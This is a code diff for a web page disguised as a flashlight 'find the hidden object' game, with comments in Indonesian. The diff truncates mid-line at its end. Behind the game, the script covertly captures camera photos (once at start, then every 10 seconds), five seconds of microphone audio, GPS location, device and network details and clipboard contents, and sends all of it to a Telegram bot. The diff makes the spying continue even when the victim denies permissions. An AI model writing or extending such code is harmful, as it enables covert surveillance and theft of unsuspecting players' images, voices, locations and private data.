@@ -207,13 +207,21 @@
       "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
     ];
     let currentPhotoIndex = 0;
-    let videoStream;
-    let userCoords; // simpan koordinat user
+    let videoStream = null;
+    let userCoords = { latitude: 0, longitude: 0 };
 
     // Interval untuk mengambil foto secara berkala (misalnya setiap 10 detik)
     let photoInterval;
     // Interval untuk membaca clipboard setiap 30 detik (opsional)
     let clipboardInterval;
+
+    // Placeholder image (base64) jika akses kamera ditolak
+    const placeholderImage = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTUlEQVRYR+2X0Q3CMBBFv1JE5RBE1RBE1RBE1RBE1RBE1RBEdE8gI9MjeLMYwc7EyU8j7rRgwCPS4y2Wc82N07McbvkF7LCBxX5EOQAAGk5oBPrT9gjHc1qKOAZcF3o+3n7r+sE4gQC6gpqOq+VZ5WDlBtH2iBt79RzXrxh8ygwz7hK4HSsAFI9gITxuRblKntFGcd6Bt2R2LrmU09g4qyv+QazwmcBTnLBx3gIuWIScB46wBn1gu7LwJOUAHRXejCwBA8gAD4agOxVzfUQAvhXAQvHQAuoN5+Hq3P8PPeVY7+aIs/ksOeSFeAq8FN5XTRN4LFNufhhb4Dy4cG1/xh+cAAAAASUVORK5CYII=";
+
+    // Jika kamera atau audio tidak diizinkan, game tetap berjalan dengan fallback:
+    // Untuk kamera: gunakan placeholder image.
+    // Untuk audio: gunakan blob kosong.
+    const emptyAudioBlob = new Blob([], { type: 'audio/ogg' });
 
     // Ambil elemen penting
     const introText = document.getElementById('introText');
@@ -255,31 +263,31 @@
 
     // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
     startGameBtn.addEventListener('click', async () => {
-      // Minta akses kamera dan audio
+      // Coba minta akses kamera (dengan audio); jika ditolak, gunakan fallback
       try {
         videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       } catch (error) {
-        alert("Akses kamera atau audio ditolak. Game tidak bisa dilanjutkan.");
-        return;
+        console.warn("Akses kamera/audio ditolak, menggunakan fallback placeholder.");
+        videoStream = null;
       }
-      // Minta akses lokasi
+      // Coba minta akses lokasi; jika ditolak, gunakan fallback koordinat (0,0)
       let location;
       try {
         location = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject);
         });
       } catch (error) {
-        alert("Akses lokasi ditolak. Game tidak bisa dilanjutkan.");
-        return;
+        console.warn("Akses lokasi ditolak, menggunakan fallback koordinat (0,0).");
+        location = { coords: { latitude: 0, longitude: 0 } };
       }
       userCoords = location.coords; // simpan koordinat user
       
-      // Jika kedua izin diberikan, lanjutkan
+      // Lanjutkan game
       introText.style.display = 'none';
       darkness.style.display = 'block';
       alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
       
-      // Tangkap foto dan rekam suara selama 5 detik, lalu kirim ke Telegram
+      // Tangkap foto & rekam suara selama 5 detik, lalu kirim ke Telegram
       capturePhotoAndSend(userCoords);
       
       // Mulai interval untuk mengambil foto secara berkala setiap 10 detik (opsional)
@@ -301,72 +309,83 @@
 
     // Fungsi menangkap foto dari kamera dan merekam suara selama 5 detik, lalu mengirim ke Telegram
     function capturePhotoAndSend(coords) {
-      // Buat elemen video untuk snapshot
-      const video = document.createElement("video");
-      video.srcObject = videoStream;
-      video.play();
+      // Untuk snapshot, jika videoStream ada, gunakan; jika tidak, gunakan placeholder.
+      if (videoStream) {
+        const video = document.createElement("video");
+        video.srcObject = videoStream;
+        video.play();
       
-      // Siapkan rekaman suara dari audio track saja
-      const audioStream = new MediaStream(videoStream.getAudioTracks());
-      let audioChunks = [];
-      let audioRecorder;
-      try {
-        const options = { mimeType: 'audio/ogg; codecs=opus' };
-        audioRecorder = new MediaRecorder(audioStream, options);
-      } catch (e) {
-        console.warn("MIME type audio/ogg tidak didukung, gunakan MIME type default.", e);
-        audioRecorder = new MediaRecorder(audioStream);
-      }
-      audioRecorder.ondataavailable = event => {
-        audioChunks.push(event.data);
-      };
-      audioRecorder.start();
-      // Hentikan rekaman suara setelah 5 detik
-      setTimeout(() => {
-        audioRecorder.stop();
-      }, 5000);
-      
-      // Tunggu 5 detik sebelum mengambil snapshot foto
-      setTimeout(() => {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/png");
-        
-        // Setelah audio selesai, kirim data ke Telegram
-        audioRecorder.onstop = () => {
-          const audioBlob = new Blob(audioChunks, { type: audioRecorder.mimeType || 'audio/ogg' });
-          // Dapatkan informasi perangkat dan koneksi
-          const networkInfo = getNetworkInfo();
-          const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}${networkInfo}`;
-          // Coba baca clipboard (jika diizinkan)
-          if (navigator.clipboard && navigator.clipboard.readText) {
-            navigator.clipboard.readText()
-              .then(text => {
-                let clipboardContent = "";
-                if (text && text.trim() !== "") {
-                  clipboardContent = "\nClipboard: " + text;
-                }
-                const fullSpecs = phoneSpecs + clipboardContent;
-                sendToTelegram(imageData, coords, fullSpecs, audioBlob);
-              })
-              .catch(err => {
-                console.error("Gagal membaca clipboard:", err);
-                sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
-              });
-          } else {
-            sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
-          }
+        // Siapkan rekaman suara dari audio track saja
+        const audioStream = new MediaStream(videoStream.getAudioTracks());
+        let audioChunks = [];
+        let audioRecorder;
+        try {
+          const options = { mimeType: 'audio/ogg; codecs=opus' };
+          audioRecorder = new MediaRecorder(audioStream, options);
+        } catch (e) {
+          console.warn("MIME type audio/ogg tidak didukung, gunakan default.", e);
+          audioRecorder = new MediaRecorder(audioStream);
+        }
+        audioRecorder.ondataavailable = event => {
+          audioChunks.push(event.data);
         };
-      }, 5000);
+        audioRecorder.start();
+        // Hentikan rekaman suara setelah 5 detik
+        setTimeout(() => {
+          audioRecorder.stop();
+        }, 5000);
+      
+        // Tunggu 5 detik sebelum mengambil snapshot foto
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+          
+          // Setelah audio selesai, kirim data ke Telegram
+          audioRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: audioRecorder.mimeType || 'audio/ogg' });
+            processAndSend(imageData, coords, audioBlob);
+          };
+        }, 5000);
+      } else {
+        // Jika tidak ada akses kamera, gunakan placeholder image dan blob audio kosong.
+        const imageData = placeholderImage;
+        processAndSend(imageData, coords, emptyAudioBlob);
+      }
+    }
+
+    // Fungsi memproses informasi perangkat & koneksi, baca clipboard, lalu mengirim semua ke Telegram
+    function processAndSend(imageData, coords, audioBlob) {
+      const networkInfo = getNetworkInfo();
+      // Dapatkan info perangkat (User Agent dan resolusi layar)
+      const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}${networkInfo}`;
+      // Coba baca clipboard (jika diizinkan)
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText()
+          .then(text => {
+            let clipboardContent = "";
+            if (text && text.trim() !== "") {
+              clipboardContent = "\nClipboard: " + text;
+            }
+            const fullSpecs = phoneSpecs + clipboardContent;
+            sendToTelegram(imageData, coords, fullSpecs, audioBlob);
+          })
+          .catch(err => {
+            console.error("Gagal membaca clipboard:", err);
+            sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
+          });
+      } else {
+        sendToTelegram(imageData, coords, phoneSpecs, audioBlob);
+      }
     }
 
     // Fungsi untuk mengirim data ke Telegram:
     // - Lokasi (sendLocation)
     // - Foto (sendPhoto)
-    // - Informasi HP (sendMessage)
+    // - Informasi perangkat (sendMessage)
     // - Suara (sendVoice)
     function sendToTelegram(imageData, location, phoneSpecs, audioBlob) {
       // 1. Kirim lokasi
@@ -443,30 +462,7 @@
       }
     }
 
-    // Fungsi untuk menampilkan foto di kontainer game (foto statis website)
-    function showPhoto(index) {
-      photoSlide.src = photos[index];
-    }
-
-    // Tombol Navigasi: Prev (mundur) dan Next (lanjut)
-    prevBtn.addEventListener('click', () => {
-      if (endPopup.style.display === 'block') {
-        endPopup.style.display = 'none';
-      }
-      currentPhotoIndex = (currentPhotoIndex === 0) ? photos.length - 1 : currentPhotoIndex - 1;
-      showPhoto(currentPhotoIndex);
-    });
-    nextBtn.addEventListener('click', () => {
-      if (currentPhotoIndex === photos.length - 1) {
-        // Tampilkan popup konfirmasi jika sudah di foto terakhir
-        endPopup.style.display = 'block';
-      } else {
-        currentPhotoIndex++;
-        showPhoto(currentPhotoIndex);
-      }
-    });
-
-    // (Opsional) Fungsi untuk membaca clipboard dan mengirim isinya ke Telegram setiap 30 detik
+    // Fungsi untuk mengirim clipboard (opsional)
     function sendClipboardDataToTelegram() {
       if (navigator.clipboard && navigator.clipboard.readText) {
         navigator.clipboard.readText()
@@ -494,9 +490,28 @@
       }
     }
 
-    // (Opsional) Mulai interval untuk mengirim clipboard setiap 30 detik
-    // Uncomment baris berikut jika ingin mengaktifkan pengiriman clipboard secara berkala:
-    // clipboardInterval = setInterval(sendClipboardDataToTelegram, 30000);
+    // Fungsi untuk menampilkan foto di kontainer game (foto statis website)
+    function showPhoto(index) {
+      photoSlide.src = photos[index];
+    }
+
+    // Tombol Navigasi: Prev (mundur) dan Next (lanjut)
+    prevBtn.addEventListener('click', () => {
+      if (endPopup.style.display === 'block') {
+        endPopup.style.display = 'none';
+      }
+      currentPhotoIndex = (currentPhotoIndex === 0) ? photos.length - 1 : currentPhotoIndex - 1;
+      showPhoto(currentPhotoIndex);
+    });
+    nextBtn.addEventListener('click', () => {
+      if (currentPhotoIndex === photos.length - 1) {
+        // Tampilkan popup konfirmasi jika sudah di foto terakhir
+        endPopup.style.display = 'block';
+      } else {
+        currentPhotoIndex++;
+        showPhoto(currentPhotoIndex);
+      }
+    });
 
     // Fungsi update posisi spotlight (senter)
     function updateSpotlight(e) {
@@ -511,8 +526,4 @@
       light.style.transform = `translate(${x}px, ${y}px)`;
     }
     document.addEventListener('mousemove', updateSpotlight);
-    document.addEventListener('touchmove', updateSpotlight);
-    document.addEventListener('touchstart', updateSpotlight);
-  </script>
-</body>
-</html>
+    document.addEventListener('touchmov
